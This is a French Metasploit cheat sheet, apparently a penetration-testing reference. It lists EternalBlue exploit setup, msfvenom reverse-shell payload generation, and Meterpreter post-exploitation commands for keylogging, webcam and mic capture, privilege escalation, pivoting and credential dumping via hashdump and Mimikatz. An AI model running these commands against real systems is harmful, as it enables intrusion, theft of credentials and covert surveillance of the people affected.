📦 Installation & Démarrage

Setup
# Kali Linux (préinstallé)
msfconsole

# Initialiser la base de données
sudo msfdb init
sudo msfdb start

# Démarrer msfconsole
sudo msfconsole -q    # -q = sans bannière

# Vérifier la connexion DB
msf6> db_status

# Mettre à jour
sudo apt update && sudo apt install metasploit-framework

📋 Commandes essentielles msfconsole

Navigation & Recherche
# Rechercher un module
msf6> search eternalblue
msf6> search type:exploit platform:windows smb
msf6> search cve:2021-44228
msf6> search name:ms17_010

# Utiliser un module
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> use 0    # utiliser par numéro dans les résultats search

# Infos sur le module
msf6> info
msf6> options
msf6> show options

# Configurer les options
msf6> set RHOSTS 192.168.1.1
msf6> set RPORT 445
msf6> set LHOST 192.168.1.100
msf6> set LPORT 4444

# Lancer l'exploit
msf6> run
msf6> exploit

# Vérifier sans exploiter
msf6> check

# Retourner au menu principal
msf6> back

# Aide
msf6> help

🎯 Payloads

Payloads courants
# Lister les payloads disponibles pour le module
msf6> show payloads

# Payloads Meterpreter
msf6> set PAYLOAD windows/meterpreter/reverse_tcp
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6> set PAYLOAD python/meterpreter/reverse_tcp

# Shells simples
msf6> set PAYLOAD windows/shell/reverse_tcp
msf6> set PAYLOAD cmd/unix/reverse_bash
msf6> set PAYLOAD generic/shell_reverse_tcp

# Payloads stageless (meilleurs pour certains contextes)
msf6> set PAYLOAD windows/x64/meterpreter_reverse_tcp  # sans /

# Générer un payload avec msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.php
msfvenom -l payloads # Lister tous les payloads
msfvenom -l formats  # Formats de sortie

🖥️ Meterpreter — Post-Exploitation

Commandes Meterpreter
# === SYSTÈME ===
meterpreter> sysinfo          # Infos système
meterpreter> getuid           # Utilisateur actuel
meterpreter> getpid           # PID du process
meterpreter> ps               # Liste des processus
meterpreter> shell            # Shell système
meterpreter> pwd              # Répertoire courant
meterpreter> ls               # Lister fichiers
meterpreter> cd /tmp          # Changer répertoire
meterpreter> search -f *.txt  # Rechercher fichiers

# === FICHIERS ===
meterpreter> download /etc/passwd
meterpreter> upload payload.exe C:\\Windows\\Temp\\
meterpreter> cat /etc/passwd

# === PRIVILEGE ESCALATION ===
meterpreter> getsystem        # Tentative auto PrivEsc
meterpreter> getprivs         # Voir les privilèges
meterpreter> migrate <PID>    # Migrer dans un autre process
msf6> use post/multi/recon/local_exploit_suggester  # Suggérer PrivEsc

# === RÉSEAU ===
meterpreter> ipconfig
meterpreter> arp
meterpreter> portfwd add -l 8080 -p 80 -r 192.168.1.10  # Port forwarding
meterpreter> route add 10.0.0.0/8 1  # Pivoting

# === CAPTURES ===
meterpreter> screenshot
meterpreter> record_mic
meterpreter> webcam_snap
meterpreter> keyscan_start && keyscan_dump  # Keylogger

# === CREDENTIALS ===
meterpreter> run post/windows/gather/hashdump
meterpreter> load kiwi       # Mimikatz intégré
meterpreter> creds_all       # Dump tous les credentials (kiwi)
meterpreter> lsa_dump_sam    # SAM database

# === SESSIONS ===
meterpreter> background       # Mettre en arrière-plan
msf6> sessions                # Voir les sessions
msf6> sessions -i 1           # Rejoindre session 1

🔄 Handler universel (multi/handler)

Listener pour payloads msfvenom
# Configurer un listener
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 4444
msf6> run -j  # -j = en arrière-plan (job)

# Voir les jobs
msf6> jobs

# Importer un scan Nmap
msf6> db_import scan.xml
msf6> hosts
msf6> services

⚡ Modules post-exploitation utiles

Modules post/ et auxiliary/
# Suggérer des vecteurs de PrivEsc
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION 1; run

# Dump hashes Windows
msf6> use post/windows/gather/hashdump

# Énumération Windows
msf6> use post/windows/gather/enum_applications
msf6> use post/windows/gather/enum_shares
msf6> use post/windows/gather/credentials/credential_collector

# Scanner réseau depuis la cible (pivot)
msf6> use auxiliary/scanner/portscan/tcp
msf6> set RHOSTS 10.0.0.0/24; set PORTS 22,80,445; run

# SMB
msf6> use auxiliary/scanner/smb/smb_version
msf6> use auxiliary/scanner/smb/smb_login

# HTTP
msf6> use auxiliary/scanner/http/http_version
msf6> use auxiliary/scanner/http/dir_scanner
